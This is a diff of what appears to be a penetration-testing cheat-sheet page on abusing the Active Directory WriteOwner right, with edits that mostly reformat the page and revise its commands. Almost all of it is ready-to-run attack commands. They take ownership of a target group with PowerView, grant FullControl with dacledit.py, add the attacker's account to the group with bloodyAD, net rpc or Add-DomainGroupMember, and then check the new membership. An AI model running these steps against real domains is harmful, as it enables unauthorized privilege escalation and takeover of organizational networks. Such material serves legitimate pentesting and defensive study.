@@ -9,37 +9,26 @@ tags: ["WriteOwner", "active driectory", "ad", "Windows", "own", "dacledit"]
 {{< tab set1 tab1 active >}}Windows{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-#### 1. Import PowerView.ps1
-
-<div>
+#### 1. Import PowerView
 
 ```console
 . .\PowerView.ps1
 ```
 
-</div>
-
 #### 2. Change owner
 
-<div>
-
 ```console
-Set-DomainObjectOwner -Identity <TARGET_GROUP> -OwnerIdentity <USER>
+Set-DomainObjectOwner -Identity <TARGET_GROUP> -OwnerIdentity <TARGET_USER>
 ```
-
-</div>
 
 {{< /tabcontent >}}
 
 ### Abuse #2 : Add user to the group
 
-{{< tab set2 tab1 active >}}Linux{{< /tab >}}
-{{< tab set2 tab2 >}}Windows{{< /tab >}}
-{{< tabcontent set2 tab1 >}}
+{{< tab set2 tab1 active >}}Linux{{< /tab >}}{{< tab set2 tab2 >}}Windows{{< /tab >}}
+{{<  tabcontent set2 tab1  >}}
 
 #### 0. Install latest impacket (included dacledit.py)
-
-<div>
 
 ```console
 git clone https://github.com/fortra/impacket.git
@@ -53,58 +42,50 @@ cd impacket
 pip3 install .
 ```
 
-</div>
-
-#### 1. Add domain object
-
-<div>
+#### 1. Add full control permission to the user over the group
 
 ```console
-sudo ntpdate -s <DC> && dacledit.py -k '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal <USER> -target <TARGET_GROUP> -action write -rights WriteMembers
+sudo ntpdate -s <DC> && dacledit.py -k '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal <USER> -target <TARGET_GROUP> -inheritance -action write -rights FullControl
 ```
 
-</div>
+#### 2. Add the user to group
 
-#### 2. Add group member
+{{< tab set3 tab1 active >}}bloodyAD{{< /tab >}}{{< tab set3 tab2 >}}rpc{{< /tab >}}
+{{< tabcontent set3 tab1 >}}
 
-<div>
+```console
+python3 bloodyAD.py -k -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add groupMember '<TARGET_GROUP>' '<USER>'
+```
+
+{{< /tabcontent >}}
+{{< tabcontent set3 tab2 >}}
 
 ```console
 kinit <USER>
 ```
 
 ```console
-sudo ntpdate -s <DC> && net rpc group addmem <TARGET_GROUP> <USER> -U <USER> --use-kerberos=required -S <DC> --no-pass
+sudo ntpdate -s <DC> && net rpc group addmem '<TARGET_GROUP>' '<USER>' -U '<USER>' --use-kerberos=required -S <DC> --no-pass
 ```
 
-</div>
+{{< /tabcontent >}}
 
 #### 3. Check
 
-<div>
-
 ```console
-sudo ntpdate -s <DC> && net rpc group members <TARGET_GROUP> -U <USER> --use-kerberos=required -S <DC> --no-pass
+sudo ntpdate -s <DC> && net rpc group members '<TARGET_GROUP>' -U '<USER>' --use-kerberos=required -S <DC> --no-pass
 ```
-
-</div>
 
 {{< /tabcontent >}}
 {{< tabcontent set2 tab2 >}}
 
 #### 1. Import PowerView.ps1 
 
-<div>
-
 ```console
 . .\PowerView.ps1
 ```
 
-</div>
-
-#### 2. Create cred object (runas) \[optional\]
-
-<div>
+#### 2. Create a cred object (runas) \[optional\]
 
 ```console
 $username = '<DOMAIN>\<USER>'
@@ -118,11 +99,7 @@ $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
 $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
 ```
 
-</div>
-
 #### 3. Add user to group
-
-<div>
 
 ```console
 Add-DomainObjectAcl -TargetIdentity <TARGET_GROUP> -PrincipalIdentity '<DOMAIN>/<USER>' -Rights All -DomainController <DC> -Credential $cred
@@ -132,11 +109,7 @@ Add-DomainObjectAcl -TargetIdentity <TARGET_GROUP> -PrincipalIdentity '<DOMAIN>/
 Add-DomainGroupMember -Identity <TARGET_GROUP> -Members <USER> -Credential $cred
 ```
 
-</div>
-
-#### Check
-
-<div>
+#### 4. Check
 
 ```console
 Get-DomainGroupMember -Identity <TARGET_GROUP> -Domain <DOMAIN> -DomainController <DC> -Credential $cred | fl MemberName
@@ -152,8 +125,4 @@ net user <USER>
 whoami /groups
 ```
 
-</div>
-
 {{< /tabcontent >}}
-
-<br>
